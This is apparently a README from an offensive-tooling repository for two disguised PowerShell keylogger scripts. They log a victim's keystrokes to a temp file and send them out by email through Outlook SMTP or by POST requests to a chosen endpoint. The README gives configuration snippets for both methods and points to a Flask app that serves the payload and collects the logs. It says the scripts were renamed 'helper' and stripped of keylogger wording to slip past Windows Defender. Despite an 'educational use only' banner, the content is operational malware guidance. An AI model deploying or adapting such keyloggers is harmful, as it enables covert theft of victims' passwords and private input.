**EDUCATIONAL USE ONLY, USE AT YOUR OWN RISK!**
# Powershell - Keylogger scripts

**Original source used for these:   
https://github.com/SriRam-Macha/DigiSpark-Keylogger-Payload/blob/master/Keystrokes%20Mailer%20Script.ps1**

---
**Note:**
*Scripts are renamed from key-logger to "helper", and the mentions about keyloggings are removed from the code itself as we were researching the possibilities to bypass Windows Defender etc. detection's.*

**Two scripts:**   
 
[helper_mail.ps1](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/keylogger/keylog_ps/helper_mail.ps1) - **DEPRECATED! and not even fully tested - 16.11.2023**
- Logs key presses to a file `$env:temp\help.txt` 
- Sends the file to an email address, assigned in the code.

[helper_post.ps1](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/keylogger/keylog_ps/helper_post.ps1)   
- Logs key presses to a file `$env:temp\help.txt` 
- Sends the the key presses as POST requests to server, assigned in the code.
## How to use

**[helper_mail.ps1](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/keylogger/keylog_ps/helper_mail.ps1)**    

Define:
- How many times the loop runs.
- How long is one loop (minutes).   

*Loop = Log to file, send content of file to server as POST request.*    

- From (for example yourself)
- Password
- To (your email of choice)
- Subject
- body
- SMTPServer (Outlook SMTP as an example)
- SMTPPort

```powershell
$TimesToRun = 1
$RunTimeP = 1	# Time in minutes
$From = "ADDRESS"
$Pass = "PASSWORD"
$To = "ADDRESS"
$Subject = "Daily Report"
$body = "Daily Report"
$SMTPServer = "smtp-mail.outlook.com"	# Outlook SMTP
$SMTPPort = "587"
```

## How to use

**[helper_post.ps1](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/keylogger/keylog_ps/helper_post.ps1)**   
**Define:**
- How many times the loop runs.
- How long is one loop (minutes).   

*Loop = Log to file, send content of file to server as POST request.*    

- The endpoint where the server, that accepts the POST requests, is.

```powershell
$TimesToRun = 20                      	# How many times to run the script.
$RunTimeP = 0.1                        	# Runtime in minutes for each run.
$endpoint = "ADDRESS_TO_POST_LOGS_TO"   # Address to send the file to.
```

Check out our [simple Flask app](https://github.com/therealhalonen/PhishSticks/tree/master/scripts/webhook), to serve the script and receive the keylogs.
